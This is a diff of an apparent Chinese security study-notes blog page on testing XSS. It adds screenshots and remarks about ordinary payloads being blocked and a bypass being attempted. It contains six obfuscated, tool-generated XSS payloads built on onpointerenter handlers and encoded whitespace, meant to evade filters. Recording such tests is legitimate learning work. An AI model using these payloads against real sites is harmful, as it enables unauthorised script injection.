@@ -17,6 +17,7 @@
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615110457875.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615114933178.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615115146801.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615194133200.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615115258375.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615171839691.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615171900646.png">
@@ -27,7 +28,7 @@
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615174320342.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615185244683.png">
 <meta property="article:published_time" content="2022-06-15T02:41:13.000Z">
-<meta property="article:modified_time" content="2022-06-15T11:31:59.742Z">
+<meta property="article:modified_time" content="2022-06-15T11:42:31.211Z">
 <meta property="article:author" content="1in3r">
 <meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
@@ -178,7 +179,10 @@
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615114933178.png" alt="image-20220615114933178"></p>
 <p>使用工具生成payload</p>
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615115146801.png" alt="image-20220615115146801"></p>
-<h4 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h4><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615115258375.png" alt="image-20220615115258375"></p>
+<h4 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h4><p>常规被拦</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615194133200.png" alt="image-20220615194133200"></p>
+<p>尝试绕过</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615115258375.png" alt="image-20220615115258375"></p>
 <p>以下是有效payload，测试了几个，发现工具使用的payload都差不多是固定的几个标签，大部分都是做了不一样的变形</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/+/OnpoInTEreNter%0d=%0dconfirm(1)%0dx&gt;</span><br><span class="line">&lt;a%09onpoIntErENter%0a=%0aa=prompt,a(1)%0dx&gt;</span><br><span class="line">&lt;D3v%09oNPOintereNter+=+confirm(1)%0dx&gt;</span><br><span class="line">&lt;a%0aoNpoinTeREnTer%09=%09[1].find(confirm)%0dx&gt;</span><br><span class="line">&lt;d3v%09OnpoinTerentER+=+[1].find(confirm)%0dx&gt;</span><br><span class="line">&lt;D3v%0aoNPointerEnTer%0d=%0d(confirm)()%0dx&gt;</span><br></pre></td></tr></table></figure>
 
